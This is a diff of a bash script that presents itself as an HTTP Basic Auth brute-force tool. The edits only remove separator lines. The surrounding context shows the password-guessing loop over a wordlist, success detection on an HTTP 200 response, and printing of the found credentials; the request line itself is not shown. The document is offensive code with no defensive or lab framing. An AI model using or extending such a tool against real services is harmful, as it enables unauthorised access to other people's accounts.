@@ -11,7 +11,6 @@ echo "Starting HTTP Basic Auth brute force"
 echo "Target: $URL"
 echo "Username: $USER"
 echo "Wordlist: $WORDLIST"
-echo "----------------------------------------"
 
 if [ ! -f "$WORDLIST" ]; then
     echo "Error: $WORDLIST not found"
@@ -44,11 +43,9 @@ while read -r PASSWORD; do
     
     if [ "$RESPONSE" = "200" ]; then
         echo "SUCCESS!"
-        echo "----------------------------------------"
         echo "CREDENTIALS FOUND:"
         echo "Username: $USER"
         echo "Password: $PASSWORD"
-        echo "----------------------------------------"
         FOUND=true
         break
     else
@@ -58,6 +55,5 @@ while read -r PASSWORD; do
 done < "$WORDLIST"
 
 if [ "$FOUND" = false ]; then
-    echo "----------------------------------------"
     echo "No valid password found in wordlist"
 fi
